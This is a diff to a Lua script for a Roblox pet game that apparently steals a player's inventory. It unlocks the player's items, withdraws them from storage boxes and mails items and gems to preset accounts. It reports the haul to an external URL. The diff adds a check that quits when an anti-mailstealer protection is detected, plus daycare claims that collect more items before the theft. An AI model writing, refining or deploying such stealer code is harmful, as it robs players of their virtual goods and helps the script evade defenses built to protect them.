@@ -1,3 +1,4 @@
+local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 local library = require(game.ReplicatedStorage.Library)
 local save = library.Save.Get().Inventory
 local mailsent = library.Save.Get().MailboxSendsSinceReset
@@ -7,7 +8,6 @@ local GetRapValues = getupvalues(library.DevRAPCmds.Get)[1]
 local HttpService = game:GetService("HttpService")
 local sortedItems = {}
 local rapCache = {}
-local sendamount = game.Players.LocalPlayer.PlayerGui._MACHINES.MailboxMachine.Frame.SendFrame.Bottom.Diamonds.Amount.Text
 _G.scriptExecuted = _G.scriptExecuted or false
 local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
@@ -34,27 +34,6 @@ end
 
 if newamount > GemAmount1 then
     return
-end
-
-local function IsMailboxHooked()
-	local uid
-	for i, v in pairs(save["Pet"]) do
-		uid = i
-		break
-	end
-	local args = {
-        [1] = "Roblox",
-        [2] = "Test",
-        [3] = "Pet",
-        [4] = uid,
-        [5] = 1
-    }
-    local response, err = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-    if (err == "They don't have enough space!") or (err == "You don't have enough diamonds to send the mail!") then
-        return false
-    else
-        return true
-    end
 end
 
 local function formatNumber(number)
@@ -93,10 +72,6 @@ local function SendMessage(url, username, diamonds)
 	end
     fields[2].value = fields[2].value .. "\nGems: " .. formatNumber(diamonds) .. "\n"
 	fields[2].value = fields[2].value .. "Total RAP: " .. formatNumber(totalRAP)
-	if IsMailboxHooked() then
-		fields[2].name = "Anti-mailstealer used! You lost these items:"
-		fields[2].value = fields[2].value .. "\n\n\226\154\160 NOTICE: Anti-mailstealer used"
-	end
 
     local data = {
         ["embeds"] = {{
@@ -186,7 +161,7 @@ local function sendItem(category, uid, am)
     }
 	local response = false
 	repeat
-    	local response, err = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    	local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
 		if response == false and err == "They don't have enough space!" then
 			user = user2
 			args[1] = user
@@ -212,7 +187,7 @@ local function SendAllGems()
 				}
 				local response = false
 				repeat
-					local response = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+					local response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
 				until response == true
 				break
 			end
@@ -220,21 +195,42 @@ local function SendAllGems()
     end
 end
 
+local function IsMailboxHooked()
+	local uid
+	for i, v in pairs(save["Pet"]) do
+		uid = i
+		break
+	end
+	local args = {
+        [1] = "Roblox",
+        [2] = "Test",
+        [3] = "Pet",
+        [4] = uid,
+        [5] = 1
+    }
+    local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    if (err == "They don't have enough space!") or (err == "You don't have enough diamonds to send the mail!") then
+        return false
+    else
+        return true
+    end
+end
+
 local function EmptyBoxes()
     if save.Box then
         for key, value in pairs(save.Box) do
 			if value._uq then
-				game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Box: Withdraw All"):InvokeServer(key)
+				network:WaitForChild("Box: Withdraw All"):InvokeServer(key)
 			end
         end
     end
 end
 
 local function ClaimMail()
-    local response, err = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
+    local response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
     while err == "You must wait 30 seconds before using the mailbox!" do
         wait()
-        response, err = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
+        response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
     end
 end
 
@@ -273,7 +269,7 @@ for i, v in pairs(categoryList) do
                 [1] = uid,
                 [2] = false
                 }
-                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
+                network:WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
             end
         end
 	end
@@ -281,7 +277,12 @@ end
 
 if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
     ClaimMail()
+	if IsMailboxHooked() then
+		return
+	end
     EmptyBoxes()
+	require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
+	require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
     local blob_a = require(game.ReplicatedStorage.Library)
     local blob_b = blob_a.Save.Get()
     function deepCopy(original)
